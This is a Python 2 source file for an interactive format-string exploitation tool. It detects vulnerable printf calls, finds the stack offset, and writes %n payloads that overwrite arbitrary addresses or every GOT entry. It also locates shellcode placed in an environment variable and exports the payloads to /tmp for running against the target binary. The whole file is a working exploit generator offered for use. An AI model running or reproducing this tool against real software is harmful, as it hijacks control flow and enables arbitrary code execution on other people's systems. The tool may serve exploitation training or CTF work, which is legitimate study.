import os
import sys
from subprocess import Popen,PIPE,call

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

########################

def removeTempFiles():
	return Popen(["rm *.txt"],stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()

########################

def executeProgram(binaryName, formatString):
	return Popen([binaryName, formatString],stdout=PIPE,close_fds=True).communicate()[0].strip()


########################

def parseAddressSpace(binaryName):

	filename = binaryName + "-gdb.py";
	components = binaryName.split("/");
	renameFile = "/".join(components[0:-1]) + "/*gdb.py";

	if os.path.isfile(filename) == False:
		Popen(["mv " + renameFile + " " + filename],stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()

	return Popen(["gdb", "-q", binaryName],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

def prepareSharedLibrary():
	return Popen(["make","-C","."],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

# Compares address.txt and procMap.txt contents 
# Checks if any address is in memory with w bit set.
def findVulnPrintf():
	with open('procMap.txt') as f:
		zones = []
		contents = f.read();
		for line in contents.split('\n'):
			if not line:
				continue
			memrange, perms, _ = line.split(None, 2)
			start, end = memrange.split('-')
			zones.append({
				'start': int(start, 16),
				'end': int(end, 16),
				'perms': perms
			})

	with open('address.txt') as f:
		address = f.read().splitlines()				


	for index in range(len(address)):
		for mapping in zones:
			if mapping["start"] <= int(address[index],16) < mapping["end"]:
				break

		# Check the memory permissions
		if "w" in mapping["perms"]:
			print bcolors.FAIL + bcolors.BOLD + "Format function number %d" % (index+1) + bcolors.ENDC + bcolors.FAIL + " (in order of execution) has format string in writable memory." + bcolors.ENDC;

########################

def calculateOffset(binaryName, formatString):
	output = "";
	arg = 1;	
	
	while(1):

		if(arg>50):
			return -1;		

		format =  formatString + "%" + str(arg) + "$x";		
		output = executeProgram(binaryName,format);

		if( formatString+"41414141" in output):
			print("Offset between format string and its address is:" + bcolors.OKGREEN + bcolors.BOLD +  "  %d words" % arg + bcolors.ENDC);
			print("Format string used:" + bcolors.OKBLUE + bcolors.BOLD + "  %s" % format + bcolors.ENDC);
			return arg;

		arg = arg + 1;

########################

def prepareFormatString(dummyString, addressToWrite, addressToOverwrite, distanceInWords):

	#Pad 0's to make address length to 8
	length = 8 - len(addressToWrite); 
	addressToWrite = length*'0' + addressToWrite;

	length = 8 - len(addressToOverwrite); 
	addressToOverwrite = length*'0' + addressToOverwrite;

	splitsAddressToOverwrite = [addressToOverwrite[x:x+2] for x in range(0,len(addressToOverwrite),2)]
	splitsAddressToWrite = [addressToWrite[x:x+2] for x in range(0,len(addressToWrite),2)]

	byte = [None]*4;

	for index in range(0, 4): 
		byte[index] = format(int(splitsAddressToOverwrite[3], 16) + index ,'x');
		byte[index] = byte[index] if (len(byte[index]) == 2) else "0"+byte[index];

	addressString = dummyString;
	addressStringToPrint = dummyString;
		
	for index in range(0, 4):
		addressString = (addressString + chr(int(byte[index],16)) + chr(int(splitsAddressToOverwrite[2],16))+chr(int(splitsAddressToOverwrite[1],16))+chr(int(splitsAddressToOverwrite[0],16)));
		addressStringToPrint = (addressStringToPrint + "\\x" + byte[index]+ "\\x" + splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0]);

	initialNum = len(dummyString)+16;
	offset = [None]*4;

	offset[0] = int(splitsAddressToWrite[3],16) - initialNum;
	if offset[0] < 8:
		 offset[0] = int(splitsAddressToWrite[3],16) + 256 - initialNum;

	j = 1;
	for index in xrange(3, 0, -1): 
		offset[j] = int(splitsAddressToWrite[index-1],16) - int(splitsAddressToWrite[index],16);
		if offset[j] < 8:
			 offset[j] = int(splitsAddressToWrite[index-1],16) + 256 - int(splitsAddressToWrite[index],16);
		j = j + 1;

	distanceInWords = distanceInWords + len(dummyString)/4;
	exploitString = "";

	for index in range(0, 4):
		exploitString = (exploitString + "%" + str(distanceInWords) + "$" + str(offset[index]) + "x%" + str(distanceInWords+index) + "$n");

	finalExploitString = addressString + exploitString;
	finalExploitStringToPrint = addressStringToPrint + exploitString;	
	return finalExploitString,finalExploitStringToPrint;

########################

def exportShellCode():
	return -1;


def exportFormatStringToFile(formatString):
	
	for i in range(len(formatString)):
		filename = "/tmp/input" + str(i+1) + ".txt";
		f = open(filename, 'w+')
		f.write(formatString[i]);
		f.close();


########################

def findExportedShellCodeAddress():
	with open('gdb.txt') as f:
		contents = f.read();

	lines = "";
	components = [];
	for line in contents.split('\n'):
		if not "SHELLCODE" in line:
			continue;
		lines = line;
		components = lines.split(":",2);
	return components;

########################

def findAllGOTAddresses(binaryName):
	p1 = Popen(["objdump", "--dynamic-reloc", binaryName], stdout=PIPE)
	p2 = Popen(["cut", "-d ", "-f1"], stdin=p1.stdout, stdout=PIPE).communicate()[0]
	p1 = Popen(["objdump", "--dynamic-reloc", binaryName], stdout=PIPE)
	p3 = Popen(["cut", "-d ", "-f5"], stdin=p1.stdout, stdout=PIPE).communicate()[0]

	zones = [];
	names = [];

	for line in p2.split('\n'):
		if not line:
			continue
		zones.append(line)

	for line in p3.split('\n'):
		if not line:
			continue
		names.append(line)

	del zones[0:4];

	return zones,names;

########################

def main():

	if(len(sys.argv) < 2):
		print("Usage: python formatStringExploit.py binaryName")
		return;
	
	binaryName = os.environ["PWD"] + "/" + (sys.argv)[1];	
	
	if os.path.isfile(binaryName) == False:
		print("%s does not exist!" % sys.argv[1]);
		return;

	dummyString = "";
	r = 11;

	print(bcolors.BOLD + "\n\
	1. Auto find if vulnerable.\n\
	2. Auto find distance between format string and its address in words.\n\
	3. Provide addToWrite,addToOverwrite and distance in words to get exploit string.\n\
	4. Provide addToWrite and distance in words to auto create potential exploit strings using GOT addresses.\n\
	5. Find shellcode Address if present in environment variable (will check for SHELLCODE)\n\
	6. Quit" + bcolors.ENDC);

	while True:	
		choice = raw_input(bcolors.BOLD + "-> " + bcolors.ENDC).lower().rstrip()
	    
		if choice=="1":
			removeTempFiles();
			parseAddressSpace(binaryName);		
			prepareSharedLibrary();
			os.environ["LD_PRELOAD"] = os.environ["PWD"] + "/customFormatFunctions.so";
			output = executeProgram(binaryName, "test");
			del os.environ["LD_PRELOAD"];
			findVulnPrintf();

		elif choice=="2":
			r = calculateOffset(binaryName, "AAAA");	
			dummyString = "AAAA";
			if(r == -1):
				r = calculateOffset(binaryName, "AAAAA");
				dummyString = "AAAAA";
				if(r == -1):
					print(bcolors.OKGREEN + "Cannot find offset" + bcolors.ENDC);
					dummyString = "";
			
		elif choice=="3":
			print(bcolors.BOLD + "Enter addressToWrite, addressToOverwrite, Offset: (e.g., 080905040 080905044 11)" + bcolors.ENDC)
			choice = raw_input();
			values = choice.split();
			if(len(values) != 3):
				print("Please try again.")
				continue;
			exploitString,exploitStringToPrint = prepareFormatString(dummyString,values[0],values[1],int(values[2]));
			print bcolors.FAIL + bcolors.BOLD + exploitStringToPrint + bcolors.ENDC;	
			strings = [];
			strings.append(exploitString);
			exportFormatStringToFile(strings);
			print (bcolors.OKGREEN + "Exploit exported to /tmp/input1.txt. Use ./" + (sys.argv)[1] + " \"$(< /tmp/input1.txt)\" to check it." + bcolors.ENDC);
			

		elif choice=="4":

			print(bcolors.BOLD + "Enter addressToWrite and the Offset: (e.g., 080905040 11)" + bcolors.ENDC)
			choice = raw_input();
			values = choice.split();

			if(len(values) != 2):
				print("Please try again")
				continue;

			gotAddresses,names = findAllGOTAddresses(binaryName);
			strings = [];
			i = 0;
			for i in range(len(gotAddresses)):
				exploit,exploitStringToPrint = prepareFormatString(dummyString,values[0],gotAddresses[i],int(values[1]));	
				print("Exploit %d for "%(i+1) + bcolors.BOLD + bcolors.OKGREEN + "%s\n" % names[i] + bcolors.FAIL + " %s\n-------" % exploitStringToPrint + bcolors.ENDC);
				strings.append(exploit);

			exportFormatStringToFile(strings);
			print ("Exploits exported to /tmp/input1.txt - /tmp/input%d.txt. Use ./%s $(< /tmp/input[fileNo].txt)\" to check them." % ((i+1),sys.argv[1]));


		elif choice=="5":
			parseAddressSpace(binaryName);				
			address = findExportedShellCodeAddress();
			if(len(address)==2):
				print "%s" % address[1].strip();
				print "Address of Shellcode variable is:" + bcolors.BOLD + bcolors.OKGREEN + "%s" % address[0] + bcolors.ENDC;
				print "Shellcode starts from:" + bcolors.BOLD + bcolors.OKGREEN + "%s" % format(int(address[0],16)+16,'x') + bcolors.ENDC;
			else:
				print ("Cannot find address of SHELLCODE");

		elif choice=="6":
			break;

		else:
			print("Incorrect option");
	    

if __name__ == '__main__':
	main()
